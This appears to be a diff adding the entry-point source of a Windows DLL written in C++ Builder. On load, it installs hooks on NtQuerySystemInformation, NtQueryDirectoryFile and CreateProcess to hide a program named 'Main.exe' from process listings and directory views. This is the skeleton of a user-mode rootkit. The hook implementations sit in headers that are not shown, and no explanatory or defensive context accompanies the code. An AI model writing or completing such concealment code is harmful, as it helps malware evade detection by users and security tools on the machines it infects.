@@ -1,0 +1,26 @@
+﻿#include <vcl.h>
+#include "Winternl.h"
+
+HINSTANCE g_hinstDll;
+AnsiString MyPath,CurrentProcessPath,HideProcessName ="Main.exe";
+WCHAR* HiddenPatten = L"Main.exe";
+
+#include "MyFuction.h"
+#include "Hook_CreateProcess.h"
+#include "Hook_NtQSysInfo.h"
+#include "Hook_NtQDFile.h"
+
+int WINAPI DllEntryPoint(HINSTANCE hinst, unsigned long reason, void* lpReserved){
+	if(reason == DLL_PROCESS_ATTACH){
+		g_hinstDll = hinst;
+		MyPath = String(GetMyPath(hinst));
+		CurrentProcessPath = (Application->ExeName);
+		LauchNtQSysInfoHook();
+		SetUpNtQDFHook();
+		LauchCreateProcessHook();
+
+	}else if(reason == DLL_PROCESS_DETACH){
+
+	}
+	return true;
+}
